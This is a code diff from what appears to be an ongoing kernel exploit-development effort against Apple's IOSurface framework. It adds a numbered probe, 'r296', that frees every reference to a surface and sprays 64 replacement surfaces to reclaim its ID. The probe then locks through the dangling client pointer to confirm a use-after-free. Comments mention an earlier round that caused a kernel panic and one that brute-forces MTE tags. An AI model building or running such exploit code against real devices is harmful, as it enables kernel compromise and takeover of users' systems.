@@ -3873,6 +3873,174 @@ static void r295_probe(void) {
     fflush(stdout);
 }
 
+/* r296: Proper free + stale ClientLock — verify kernel object is freed.
+ * r295 SHOWED: ClientLock succeeds 10/10, but the stale client's OWN reference
+ * may keep the kernel surface alive. Need to verify the kernel object
+ * is actually freed before spraying.
+ *
+ * REFCOUNT MODEL:
+ *   IOSurfaceCreate(+1) → kernel refcount=1
+ *   N × ClientLookup(+N) → kernel refcount=1+N
+ *   CFRelease(surf) → framework release, kernel -1 → refcount=N
+ *   N × ClientRelease → kernel -N → refcount=0 → FREED
+ *
+ * So if we do:
+ *   Create(+1) + 3*Lookup(+3) → ref=4
+ *   CFRelease(-1) → ref=3
+ *   We keep stale_cl (holds 1 ref). Release the other 2: ref=1
+ *   Now kernel object has ref=1 from stale_cl only.
+ *   Release stale_cl's ref → ref=0 → FREED
+ *   But we lose the userspace client object too!
+ *
+ * TRICK: The userspace IOSurfaceClientRef is a separate object from the
+ * kernel's IOSurface. When ClientRelease drops the LAST client ref,
+ * the kernel frees the IOSurface. But the userspace client pointer
+ * still exists in memory (dangling). If we spray, we can reclaim
+ * the userspace client's memory.
+ *
+ * But wait: ClientRelease on the last ref should free the userspace object.
+ * However, we're calling ClientLock AFTER the last ClientRelease, so the
+ * userspace client object is FREED. The ClientLock reads from freed
+ * userspace memory (no MTE!), gets the cached surface ID, sends it
+ * to the kernel. If the ID was reused by spray, kernel locks spray.
+ * If not, kernel returns error or locks the original (but it was freed!).
+ *
+ * Let's test: fully free everything, then spray, then ClientLock.
+ *
+ * Part 1: Verify surface is gone (IOSurfaceLookup returns NULL)
+ * Part 2: ClientLock on fully-freed client → what happens?
+ * Part 3: If Lock succeeds, check which surface seed increments on
+ */
+static void r296_probe(void) {
+    rlog("\n=== r296: Proper free + stale ClientLock ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef uint32_t (*clientGetID_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientGetID_t clGetID = (clientGetID_t)dlsym(iosurfH, "IOSurfaceClientGetID");
+
+    int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+
+    for (int trial = 0; trial < 3; trial++) {
+        rlog("--- Trial %d ---\n", trial);
+        fflush(stdout);
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        IOSurfaceClientRef stale = clLookup(victimID);
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+
+        uint32_t staleID = clGetID ? clGetID(stale) : 0;
+        rlog("  victimID=%u stale=%p staleID=%u\n", victimID, stale, staleID);
+
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+        clRelease(stale);
+        rlog("  freed ALL refs (CFRelease + 3 ClientRelease)\n");
+
+        IOSurfaceRef lookup_check = IOSurfaceLookup(victimID);
+        rlog("  post-free IOSurfaceLookup(victimID=%u) = %p\n", victimID, lookup_check);
+        if (lookup_check) {
+            rlog("  Surface still alive — victim not fully freed!\n");
+            CFRelease(lookup_check);
+        } else {
+            rlog("  Surface gone — victim is freed in kernel.\n");
+        }
+        fflush(stdout);
+
+        IOSurfaceRef sprays[64];
+        int spray_reused_id = -1;
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+            CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+            sprays[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            if (sprays[i] && IOSurfaceGetID(sprays[i]) == victimID) {
+                spray_reused_id = i;
+            }
+        }
+        rlog("  sprayed 64, reused_id_idx=%d\n", spray_reused_id);
+        if (spray_reused_id >= 0) {
+            int mark = 0xFACE0000 + trial;
+            CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &mark);
+            IOSurfaceSetValue(sprays[spray_reused_id], CFSTR("r296_mark"), mv);
+            CFRelease(mv);
+        }
+        fflush(stdout);
+
+        rlog("  ClientLock on fully-freed stale=%p...\n", stale);
+        fflush(stdout);
+        uint32_t seed = 0;
+        kern_return_t lr = clLock(stale, 0, &seed);
+        rlog("  ClientLock=0x%x seed=%u\n", lr, seed);
+
+        if (lr == 0) {
+            rlog("  Lock succeeded on freed client!\n");
+            clUnlock(stale, 0, NULL);
+
+            if (spray_reused_id >= 0) {
+                uint32_t spray_seed = IOSurfaceGetSeed(sprays[spray_reused_id]);
+                rlog("  spray[%d] seed=%u (should be >0 if lock went there)\n",
+                    spray_reused_id, spray_seed);
+            }
+
+            uint32_t staleID2 = clGetID ? clGetID(stale) : 0;
+            rlog("  stale ID after lock=%u\n", staleID2);
+        } else {
+            rlog("  ClientLock FAILED: 0x%x — freed client rejected\n", lr);
+        }
+
+        for (int i = 0; i < 64; i++) if (sprays[i]) CFRelease(sprays[i]);
+        rlog("\n");
+        fflush(stdout);
+    }
+
+    rlog("*** r296 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -29121,6 +29289,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 296) {
+            rlog("*** rounds=296: Proper free + stale ClientLock ***\n");
+            rlog("  r295: 10/10 ClientLock success but stale held a ref.\n");
+            rlog("  Test with ALL refs freed — verify kernel obj actually freed.\n\n");
+            fflush(stdout);
+            r296_probe();
             goto done;
         }
         if (rounds == 295) {
